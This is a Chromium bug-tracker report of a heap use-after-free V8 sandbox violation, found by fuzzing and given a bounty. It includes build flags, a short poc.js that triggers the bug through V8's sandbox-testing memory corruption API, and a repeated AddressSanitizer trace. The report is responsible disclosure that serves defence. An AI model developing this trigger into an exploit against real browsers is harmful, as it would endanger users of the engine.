# V8 Sandbox Bypass: Heap Use-After-Free in v8::internal::HeapLayout::CheckYoungGenerationConsistency

| Field | Value |
|-------|-------|
| **Issue ID** | [427662337](https://issues.chromium.org/issues/427662337) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>JavaScript |
| **Chrome Version** | V8 version 13.9.100 |
| **Reporter** | da...@hirsch.cx |
| **Assignee** | om...@chromium.org |
| **Created** | 2025-06-25 |
| **Bounty** | $1,000.00 |

## Description

# Steps to reproduce the problem

1. Execute poc.js with '--sandbox-fuzzing'

Build args:

```
is_asan = true
is_debug = false
dcheck_always_on = true
v8_symbol_level = 0
v8_static_library = true
v8_enable_sandbox = true
v8_enable_memory_corruption_api = true
v8_enable_verify_heap = true
v8_fuzzilli = true
sanitizer_coverage_flags = "trace-pc-guard"
target_cpu="x64"

```
# Problem Description

During fuzzing the V8 sandbox, a **heap use-after-free** was discovered.

This can be triggered by the following minimal example **poc.js:**

```
function f8() {
    function f24() {
        eval();
    }
    const v34 = new BigUint64Array(2157);
    const v35 = new Float64Array();
    for (const v36 of v34) {
        const v43 = new DataView(new Sandbox.MemoryView(0, 0x100000000));
        v43.setInt16(Sandbox.getAddressOf(v35), 0x400000001);
    }
    new Worker(f24, { type: "function" });
}
f8();
f8();
f8();

```
# Summary

V8 Sandbox Bypass: Heap Use-After-Free in v8::internal::HeapLayout::CheckYoungGenerationConsistency

# Custom Questions

#### Type of crash:

V8 Sandbox Violation

#### Crash state:

[COV] no shared memory bitmap available, skipping
[COV] edge counters initialized. Shared memory: (null) with 1595718 edges
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.

# Ignoring debug check failure in ../../v8/src/heap/scavenger-inl.h, line 401: HeapLayout::InYoungGeneration(dest) implies Heap::InToPage(dest) || Heap::IsLargeObject(dest) || MemoryChunk::FromHeapObject(dest)->IsQuarantined()

=================================================================
==21830==ERROR: AddressSanitizer: heap-use-after-free on address 0x74ae77840240 at pc 0x5d8d9429fe8c bp 0x7ffd8530d2e0 sp 0x7ffd8530d2d8
READ of size 4 at 0x74ae77840240 thread T0
#0 0x5d8d9429fe8b in v8::internal::HeapLayout::CheckYoungGenerationConsistency(v8::internal::MemoryChunk const\*) heap-layout.cc
#1 0x5d8d94865a59 in heap::base::SlotCallbackResult v8::internal::Scavenger::ScavengeObject[v8::internal::CompressedHeapObjectSlot](javascript:void(0);)(v8::internal::CompressedHeapObjectSlot, v8::internal::Tagged[v8::internal::HeapObject](javascript:void(0);)) scavenger.cc
#2 0x5d8d9491ced2 in void v8::internal::ScavengeVisitor::VisitPointersImpl[v8::internal::CompressedObjectSlot](javascript:void(0);)(v8::internal::Tagged[v8::internal::HeapObject](javascript:void(0);), v8::internal::CompressedObjectSlot, v8::internal::CompressedObjectSlot) scavenger.cc
#3 0x5d8d948f6ee4 in unsigned long v8::internal::HeapVisitor[v8::internal::ScavengeVisitor](javascript:void(0);)::VisitWithBodyDescriptor<(v8::internal::VisitorId)106, v8::internal::Context, v8::internal::Context::BodyDescriptor>(v8::internal::Tagged[v8::internal::Map](javascript:void(0);), v8::internal::Tagged[v8::internal::Context](javascript:void(0);), v8::internal::MaybeObjectSize) scavenger.cc
#4 0x5d8d94842470 in v8::internal::Scavenger::Process(v8::JobDelegate\*) scavenger.cc
#5 0x5d8d9484158c in v8::internal::ScavengerCollector::JobTask::ProcessItems(v8::JobDelegate\*, v8::internal::Scavenger\*) scavenger.cc
#6 0x5d8d94840a74 in v8::internal::ScavengerCollector::JobTask::Run(v8::JobDelegate\*) scavenger.cc
#7 0x5d8d936c6034 in v8::platform::DefaultJobState::Join() default-job.cc
#8 0x5d8d936c71e9 in v8::platform::DefaultJobHandle::Join() default-job.cc
#9 0x5d8d9484bee3 in v8::internal::ScavengerCollector::CollectGarbage() scavenger.cc
#10 0x5d8d943b76a7 in v8::internal::Heap::Scavenge() heap.cc
#11 0x5d8d943b42ff in v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::internal::GarbageCollectionReason, char const\*) heap.cc
#12 0x5d8d94457f02 in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags, v8::internal::PerformHeapLimitCheck)::$\_0::operator()() const heap.cc
#13 0x5d8d94457572 in void heap::base::Stack::SetMarkerAndCallbackImpl<v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags, v8::internal::PerformHeapLimitCheck)::$\_0>(heap::base::Stack\*, void\*, void const\*) heap.cc
#14 0x5d8d9736db42 in PushAllRegistersAndIterateStack push\_registers\_asm.cc
#15 0x5d8d943a5919 in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags, v8::internal::PerformHeapLimitCheck) heap.cc
#16 0x5d8d9429f49f in std::\_\_Cr::invoke\_result<v8::internal::HeapAllocator::AllocateRawWithRetryOrFailSlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment, v8::internal::AllocationHint)::$\_0&>::type v8::internal::HeapAllocator::CollectGarbageAndRetryAllocation<v8::internal::HeapAllocator::AllocateRawWithRetryOrFailSlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment, v8::internal::AllocationHint)::$\_0&>(v8::internal::HeapAllocator::AllocateRawWithRetryOrFailSlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment, v8::internal::AllocationHint)::$\_0&, v8::internal::AllocationType) heap-allocator.cc
#17 0x5d8d9429c6dc in v8::internal::HeapAllocator::AllocateRawWithRetryOrFailSlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment, v8::internal::AllocationHint) heap-allocator.cc
#18 0x5d8d942163de in v8::internal::Factory::CopyJSObjectWithAllocationSite(v8::internal::DirectHandle[v8::internal::JSObject](javascript:void(0);), v8::internal::DirectHandle[v8::internal::AllocationSite](javascript:void(0);)) factory.cc
#19 0x5d8d937fcdf3 in v8::internal::(anonymous namespace)::InstantiateObject(v8::internal::Isolate\*, v8::internal::DirectHandle[v8::internal::ObjectTemplateInfo](javascript:void(0);), v8::internal::DirectHandle[v8::internal::JSReceiver](javascript:void(0);), bool) api-natives.cc
#20 0x5d8d937f9db7 in v8::internal::ApiNatives::InstantiateObject(v8::internal::Isolate\*, v8::internal::DirectHandle[v8::internal::ObjectTemplateInfo](javascript:void(0);), v8::internal::DirectHandle[v8::internal::JSReceiver](javascript:void(0);)) api-natives.cc
#21 0x5d8d9383e24c in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<true>(v8::internal::Isolate\*, v8::internal::DirectHandle[v8::internal::HeapObject](javascript:void(0);), v8::internal::DirectHandle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8::internal::DirectHandle[v8::internal::Object](javascript:void(0);), unsigned long\*, int) builtins-api.cc
#22 0x5d8d9383b195 in v8::internal::Builtin\_Impl\_HandleApiConstruct(v8::internal::BuiltinArguments, v8::internal::Isolate\*) builtins-api.cc
#23 0x5d8d9383a117 in v8::internal::Builtin\_HandleApiConstruct(int, unsigned long\*, v8::internal::Isolate\*) builtins-api.cc
#24 0x5d8d9a9fc9bc in Builtins\_CEntry\_Return1\_ArgvOnStack\_BuiltinExit setup-isolate-deserialize.cc
#25 0x5d8d9a8bc81d in Builtins\_JSBuiltinsConstructStub setup-isolate-deserialize.cc
#26 0x5d8de000482f (<unknown module>)
#27 0x5d8d9a8c2862 in Builtins\_InterpreterEntryTrampoline setup-isolate-deserialize.cc
#28 0x5d8d9a8bdce6 in Builtins\_JSEntryTrampoline setup-isolate-deserialize.cc
#29 0x5d8d9a8bda2a in Builtins\_JSEntry setup-isolate-deserialize.cc
#30 0x5d8d93f600c2 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::InvokeParams const&) execution.cc
#31 0x5d8d93f64229 in v8::internal::Execution::CallScript(v8::internal::Isolate\*, v8::internal::DirectHandle[v8::internal::JSFunction](javascript:void(0);), v8::internal::DirectHandle[v8::internal::Object](javascript:void(0);), v8::internal::DirectHandle[v8::internal::Object](javascript:void(0);)) execution.cc
#32 0x5d8d936ff578 in v8::Script::Run(v8::Local[v8::Context](javascript:void(0);), v8::Local[v8::Data](javascript:void(0);)) api.cc
#33 0x5d8d92d79b61 in v8::Shell::ExecuteString(v8::Isolate\*, v8::Local[v8::String](javascript:void(0);), v8::Local[v8::String](javascript:void(0);), v8::Shell::ReportExceptions, v8::Global[v8::Value](javascript:void(0);)*) d8.cc
#34 0x5d8d92db3545 in v8::SourceGroup::Execute(v8::Isolate*) d8.cc
#35 0x5d8d92dc0631 in v8::Shell::RunMainIsolate(v8::Isolate\*, bool) d8.cc
#36 0x5d8d92dbf63e in v8::Shell::RunMain(v8::Isolate\*, bool) d8.cc
#37 0x5d8d92dc3ca8 in v8::Shell::Main(int, char\*\*) d8.cc
#38 0x759e783a6249 (/lib/x86\_64-linux-gnu/libc.so.6+0x27249) (BuildId: 79005c16293efa45b441fed45f4f29b138557e9e)

0x74ae77840240 is located 62016 bytes inside of 70400-byte region [0x74ae77831000,0x74ae77842300)
freed by thread T47 (WorkerThread) here:
#0 0x5d8d92cfb396 in free /b/s/w/ir/cache/builder/src/third\_party/llvm/compiler-rt/lib/asan/asan\_malloc\_linux.cpp:51:3
#1 0x5d8d92db7ba6 in v8::Worker::ExecuteInThread() d8.cc
#2 0x5d8d92db677c in v8::Worker::WorkerThread::Run() d8.cc
#3 0x5d8d936bb952 in v8::base::ThreadEntry(void\*) platform-posix.cc
#4 0x5d8d92cf8f86 in asan\_thread\_start(void\*) /b/s/w/ir/cache/builder/src/third\_party/llvm/compiler-rt/lib/asan/asan\_interceptors.cpp:239:28

previously allocated by thread T47 (WorkerThread) here:
#0 0x5d8d92cfc0f7 in posix\_memalign /b/s/w/ir/cache/builder/src/third\_party/llvm/compiler-rt/lib/asan/asan\_malloc\_linux.cpp:139:3
#1 0x5d8d93fea7ca in v8::internal::Isolate::New(v8::internal::IsolateGroup\*) isolate.cc
#2 0x5d8d9377d3cf in v8::Isolate::New(v8::Isolate::CreateParams const&) api.cc
#3 0x5d8d92db6a0e in v8::Worker::ExecuteInThread() d8.cc
#4 0x5d8d92db677c in v8::Worker::WorkerThread::Run() d8.cc
#5 0x5d8d936bb952 in v8::base::ThreadEntry(void\*) platform-posix.cc
#6 0x5d8d92cf8f86 in asan\_thread\_start(void\*) /b/s/w/ir/cache/builder/src/third\_party/llvm/compiler-rt/lib/asan/asan\_interceptors.cpp:239:28

Thread T47 (WorkerThread) created by T0 here:
#0 0x5d8d92cdf871 in pthread\_create /b/s/w/ir/cache/builder/src/third\_party/llvm/compiler-rt/lib/asan/asan\_interceptors.cpp:250:3
#1 0x5d8d936bb681 in v8::base::Thread::Start() platform-posix.cc
#2 0x5d8d92da2dd7 in v8::Worker::StartWorkerThread(v8::Isolate\*, std::\_\_Cr::shared\_ptr[v8::Worker](javascript:void(0);), v8::base::Thread::Priority) d8.cc
#3 0x5d8d92da235b in v8::Shell::WorkerNew(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) d8.cc
#4 0x5d8d93842aa1 in v8::internal::FunctionCallbackArguments::CallOrConstruct(v8::internal::Tagged[v8::internal::FunctionTemplateInfo](javascript:void(0);), bool) builtins-api.cc
#5 0x5d8d9383e43e in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<true>(v8::internal::Isolate\*, v8::internal::DirectHandle[v8::internal::HeapObject](javascript:void(0);), v8::internal::DirectHandle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8::internal::DirectHandle[v8::internal::Object](javascript:void(0);), unsigned long\*, int) builtins-api.cc
#6 0x5d8d9383b195 in v8::internal::Builtin\_Impl\_HandleApiConstruct(v8::internal::BuiltinArguments, v8::internal::Isolate\*) builtins-api.cc
#7 0x5d8d9383a117 in v8::internal::Builtin\_HandleApiConstruct(int, unsigned long\*, v8::internal::Isolate\*) builtins-api.cc
#8 0x5d8d9a9fc9bc in Builtins\_CEntry\_Return1\_ArgvOnStack\_BuiltinExit setup-isolate-deserialize.cc
#9 0x5d8d9a8c3381 in Builtins\_InterpreterPushArgsThenFastConstructFunction setup-isolate-deserialize.cc
#10 0x5d8d9abea6bc in Builtins\_ConstructHandler setup-isolate-deserialize.cc
#11 0x5d8d9a8c2862 in Builtins\_InterpreterEntryTrampoline setup-isolate-deserialize.cc
#12 0x5d8d9a8c2862 in Builtins\_InterpreterEntryTrampoline setup-isolate-deserialize.cc
#13 0x5d8d9a8bdce6 in Builtins\_JSEntryTrampoline setup-isolate-deserialize.cc
#14 0x5d8d9a8bda2a in Builtins\_JSEntry setup-isolate-deserialize.cc
#15 0x5d8d93f600c2 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::InvokeParams const&) execution.cc
#16 0x5d8d93f64229 in v8::internal::Execution::CallScript(v8::internal::Isolate\*, v8::internal::DirectHandle[v8::internal::JSFunction](javascript:void(0);), v8::internal::DirectHandle[v8::internal::Object](javascript:void(0);), v8::internal::DirectHandle[v8::internal::Object](javascript:void(0);)) execution.cc
#17 0x5d8d936ff578 in v8::Script::Run(v8::Local[v8::Context](javascript:void(0);), v8::Local[v8::Data](javascript:void(0);)) api.cc
#18 0x5d8d92d79b61 in v8::Shell::ExecuteString(v8::Isolate\*, v8::Local[v8::String](javascript:void(0);), v8::Local[v8::String](javascript:void(0);), v8::Shell::ReportExceptions, v8::Global[v8::Value](javascript:void(0);)*) d8.cc
#19 0x5d8d92db3545 in v8::SourceGroup::Execute(v8::Isolate*) d8.cc
#20 0x5d8d92dc0631 in v8::Shell::RunMainIsolate(v8::Isolate\*, bool) d8.cc
#21 0x5d8d92dbf63e in v8::Shell::RunMain(v8::Isolate\*, bool) d8.cc
#22 0x5d8d92dc3ca8 in v8::Shell::Main(int, char\*\*) d8.cc
#23 0x759e783a6249 (/lib/x86\_64-linux-gnu/libc.so.6+0x27249) (BuildId: 79005c16293efa45b441fed45f4f29b138557e9e)

SUMMARY: AddressSanitizer: heap-use-after-free heap-layout.cc in v8::internal::HeapLayout::CheckYoungGenerationConsistency(v8::internal::MemoryChunk const\*)
Shadow bytes around the buggy address:
0x74ae7783ff80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x74ae77840000: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x74ae77840080: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x74ae77840100: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x74ae77840180: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x74ae77840200: fd fd fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd
0x74ae77840280: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x74ae77840300: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x74ae77840380: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x74ae77840400: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x74ae77840480: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable: 00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone: fa
Freed heap region: fd
Stack left redzone: f1
Stack mid redzone: f2
Stack right redzone: f3
Stack after return: f5
Stack use after scope: f8
Global redzone: f9
Global init order: f6
Poisoned by user: f7
Container overflow: fc
Array cookie: ac
Intra object redzone: bb
ASan internal: fe
Left alloca redzone: ca
Right alloca redzone: cb
==21830==ABORTING

## V8 sandbox violation detected!

#### Reporter credit:

David Hirsch

# Additional Data

Category: Security   

Chrome Channel: Not sure   

Regression: N/A \

## Timeline

### da...@hirsch.cx (2025-06-25)

Sorry, I messed up the formatting of the stack trace in the description:

```
[COV] no shared memory bitmap available, skipping
[COV] edge counters initialized. Shared memory: (null) with 1595718 edges
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
# Ignoring debug check failure in ../../v8/src/heap/scavenger-inl.h, line 401: HeapLayout::InYoungGeneration(dest) implies Heap::InToPage(dest) || Heap::IsLargeObject(dest) || MemoryChunk::FromHeapObject(dest)->IsQuarantined()
=================================================================
==21830==ERROR: AddressSanitizer: heap-use-after-free on address 0x74ae77840240 at pc 0x5d8d9429fe8c bp 0x7ffd8530d2e0 sp 0x7ffd8530d2d8
READ of size 4 at 0x74ae77840240 thread T0
    #0 0x5d8d9429fe8b in v8::internal::HeapLayout::CheckYoungGenerationConsistency(v8::internal::MemoryChunk const*) heap-layout.cc
    #1 0x5d8d94865a59 in heap::base::SlotCallbackResult v8::internal::Scavenger::ScavengeObject<v8::internal::CompressedHeapObjectSlot>(v8::internal::CompressedHeapObjectSlot, v8::internal::Tagged<v8::internal::HeapObject>) scavenger.cc
    #2 0x5d8d9491ced2 in void v8::internal::ScavengeVisitor::VisitPointersImpl<v8::internal::CompressedObjectSlot>(v8::internal::Tagged<v8::internal::HeapObject>, v8::internal::CompressedObjectSlot, v8::internal::CompressedObjectSlot) scavenger.cc
    #3 0x5d8d948f6ee4 in unsigned long v8::internal::HeapVisitor<v8::internal::ScavengeVisitor>::VisitWithBodyDescriptor<(v8::internal::VisitorId)106, v8::internal::Context, v8::internal::Context::BodyDescriptor>(v8::internal::Tagged<v8::internal::Map>, v8::internal::Tagged<v8::internal::Context>, v8::internal::MaybeObjectSize) scavenger.cc
    #4 0x5d8d94842470 in v8::internal::Scavenger::Process(v8::JobDelegate*) scavenger.cc
    #5 0x5d8d9484158c in v8::internal::ScavengerCollector::JobTask::ProcessItems(v8::JobDelegate*, v8::internal::Scavenger*) scavenger.cc
    #6 0x5d8d94840a74 in v8::internal::ScavengerCollector::JobTask::Run(v8::JobDelegate*) scavenger.cc
    #7 0x5d8d936c6034 in v8::platform::DefaultJobState::Join() default-job.cc
    #8 0x5d8d936c71e9 in v8::platform::DefaultJobHandle::Join() default-job.cc
    #9 0x5d8d9484bee3 in v8::internal::ScavengerCollector::CollectGarbage() scavenger.cc
    #10 0x5d8d943b76a7 in v8::internal::Heap::Scavenge() heap.cc
    #11 0x5d8d943b42ff in v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::internal::GarbageCollectionReason, char const*) heap.cc
    #12 0x5d8d94457f02 in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags, v8::internal::PerformHeapLimitCheck)::$_0::operator()() const heap.cc
    #13 0x5d8d94457572 in void heap::base::Stack::SetMarkerAndCallbackImpl<v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags, v8::internal::PerformHeapLimitCheck)::$_0>(heap::base::Stack*, void*, void const*) heap.cc
    #14 0x5d8d9736db42 in PushAllRegistersAndIterateStack push_registers_asm.cc
    #15 0x5d8d943a5919 in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags, v8::internal::PerformHeapLimitCheck) heap.cc
    #16 0x5d8d9429f49f in std::__Cr::invoke_result<v8::internal::HeapAllocator::AllocateRawWithRetryOrFailSlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment, v8::internal::AllocationHint)::$_0&>::type v8::internal::HeapAllocator::CollectGarbageAndRetryAllocation<v8::internal::HeapAllocator::AllocateRawWithRetryOrFailSlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment, v8::internal::AllocationHint)::$_0&>(v8::internal::HeapAllocator::AllocateRawWithRetryOrFailSlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment, v8::internal::AllocationHint)::$_0&, v8::internal::AllocationType) heap-allocator.cc
    #17 0x5d8d9429c6dc in v8::internal::HeapAllocator::AllocateRawWithRetryOrFailSlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment, v8::internal::AllocationHint) heap-allocator.cc
    #18 0x5d8d942163de in v8::internal::Factory::CopyJSObjectWithAllocationSite(v8::internal::DirectHandle<v8::internal::JSObject>, v8::internal::DirectHandle<v8::internal::AllocationSite>) factory.cc
    #19 0x5d8d937fcdf3 in v8::internal::(anonymous namespace)::InstantiateObject(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::ObjectTemplateInfo>, v8::internal::DirectHandle<v8::internal::JSReceiver>, bool) api-natives.cc
    #20 0x5d8d937f9db7 in v8::internal::ApiNatives::InstantiateObject(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::ObjectTemplateInfo>, v8::internal::DirectHandle<v8::internal::JSReceiver>) api-natives.cc
    #21 0x5d8d9383e24c in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<true>(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::HeapObject>, v8::internal::DirectHandle<v8::internal::FunctionTemplateInfo>, v8::internal::DirectHandle<v8::internal::Object>, unsigned long*, int) builtins-api.cc
    #22 0x5d8d9383b195 in v8::internal::Builtin_Impl_HandleApiConstruct(v8::internal::BuiltinArguments, v8::internal::Isolate*) builtins-api.cc
    #23 0x5d8d9383a117 in v8::internal::Builtin_HandleApiConstruct(int, unsigned long*, v8::internal::Isolate*) builtins-api.cc
    #24 0x5d8d9a9fc9bc in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
    #25 0x5d8d9a8bc81d in Builtins_JSBuiltinsConstructStub setup-isolate-deserialize.cc
    #26 0x5d8de000482f  (<unknown module>)
    #27 0x5d8d9a8c2862 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #28 0x5d8d9a8bdce6 in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #29 0x5d8d9a8bda2a in Builtins_JSEntry setup-isolate-deserialize.cc
    #30 0x5d8d93f600c2 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) execution.cc
    #31 0x5d8d93f64229 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) execution.cc
    #32 0x5d8d936ff578 in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) api.cc
    #33 0x5d8d92d79b61 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) d8.cc
    #34 0x5d8d92db3545 in v8::SourceGroup::Execute(v8::Isolate*) d8.cc
    #35 0x5d8d92dc0631 in v8::Shell::RunMainIsolate(v8::Isolate*, bool) d8.cc
    #36 0x5d8d92dbf63e in v8::Shell::RunMain(v8::Isolate*, bool) d8.cc
    #37 0x5d8d92dc3ca8 in v8::Shell::Main(int, char**) d8.cc
    #38 0x759e783a6249  (/lib/x86_64-linux-gnu/libc.so.6+0x27249) (BuildId: 79005c16293efa45b441fed45f4f29b138557e9e)

0x74ae77840240 is located 62016 bytes inside of 70400-byte region [0x74ae77831000,0x74ae77842300)
freed by thread T47 (WorkerThread) here:
    #0 0x5d8d92cfb396 in free /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cpp:51:3
    #1 0x5d8d92db7ba6 in v8::Worker::ExecuteInThread() d8.cc
    #2 0x5d8d92db677c in v8::Worker::WorkerThread::Run() d8.cc
    #3 0x5d8d936bb952 in v8::base::ThreadEntry(void*) platform-posix.cc
    #4 0x5d8d92cf8f86 in asan_thread_start(void*) /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors.cpp:239:28

previously allocated by thread T47 (WorkerThread) here:
    #0 0x5d8d92cfc0f7 in posix_memalign /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cpp:139:3
    #1 0x5d8d93fea7ca in v8::internal::Isolate::New(v8::internal::IsolateGroup*) isolate.cc
    #2 0x5d8d9377d3cf in v8::Isolate::New(v8::Isolate::CreateParams const&) api.cc
    #3 0x5d8d92db6a0e in v8::Worker::ExecuteInThread() d8.cc
    #4 0x5d8d92db677c in v8::Worker::WorkerThread::Run() d8.cc
    #5 0x5d8d936bb952 in v8::base::ThreadEntry(void*) platform-posix.cc
    #6 0x5d8d92cf8f86 in asan_thread_start(void*) /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors.cpp:239:28

Thread T47 (WorkerThread) created by T0 here:
    #0 0x5d8d92cdf871 in pthread_create /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors.cpp:250:3
    #1 0x5d8d936bb681 in v8::base::Thread::Start() platform-posix.cc
    #2 0x5d8d92da2dd7 in v8::Worker::StartWorkerThread(v8::Isolate*, std::__Cr::shared_ptr<v8::Worker>, v8::base::Thread::Priority) d8.cc
    #3 0x5d8d92da235b in v8::Shell::WorkerNew(v8::FunctionCallbackInfo<v8::Value> const&) d8.cc
    #4 0x5d8d93842aa1 in v8::internal::FunctionCallbackArguments::CallOrConstruct(v8::internal::Tagged<v8::internal::FunctionTemplateInfo>, bool) builtins-api.cc
    #5 0x5d8d9383e43e in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<true>(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::HeapObject>, v8::internal::DirectHandle<v8::internal::FunctionTemplateInfo>, v8::internal::DirectHandle<v8::internal::Object>, unsigned long*, int) builtins-api.cc
    #6 0x5d8d9383b195 in v8::internal::Builtin_Impl_HandleApiConstruct(v8::internal::BuiltinArguments, v8::internal::Isolate*) builtins-api.cc
    #7 0x5d8d9383a117 in v8::internal::Builtin_HandleApiConstruct(int, unsigned long*, v8::internal::Isolate*) builtins-api.cc
    #8 0x5d8d9a9fc9bc in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
    #9 0x5d8d9a8c3381 in Builtins_InterpreterPushArgsThenFastConstructFunction setup-isolate-deserialize.cc
    #10 0x5d8d9abea6bc in Builtins_ConstructHandler setup-isolate-deserialize.cc
    #11 0x5d8d9a8c2862 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #12 0x5d8d9a8c2862 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #13 0x5d8d9a8bdce6 in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #14 0x5d8d9a8bda2a in Builtins_JSEntry setup-isolate-deserialize.cc
    #15 0x5d8d93f600c2 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) execution.cc
    #16 0x5d8d93f64229 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) execution.cc
    #17 0x5d8d936ff578 in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) api.cc
    #18 0x5d8d92d79b61 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) d8.cc
    #19 0x5d8d92db3545 in v8::SourceGroup::Execute(v8::Isolate*) d8.cc
    #20 0x5d8d92dc0631 in v8::Shell::RunMainIsolate(v8::Isolate*, bool) d8.cc
    #21 0x5d8d92dbf63e in v8::Shell::RunMain(v8::Isolate*, bool) d8.cc
    #22 0x5d8d92dc3ca8 in v8::Shell::Main(int, char**) d8.cc
    #23 0x759e783a6249  (/lib/x86_64-linux-gnu/libc.so.6+0x27249) (BuildId: 79005c16293efa45b441fed45f4f29b138557e9e)

SUMMARY: AddressSanitizer: heap-use-after-free heap-layout.cc in v8::internal::HeapLayout::CheckYoungGenerationConsistency(v8::internal::MemoryChunk const*)
Shadow bytes around the buggy address:
  0x74ae7783ff80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x74ae77840000: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x74ae77840080: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x74ae77840100: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x74ae77840180: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x74ae77840200: fd fd fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd
  0x74ae77840280: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x74ae77840300: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x74ae77840380: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x74ae77840400: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x74ae77840480: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
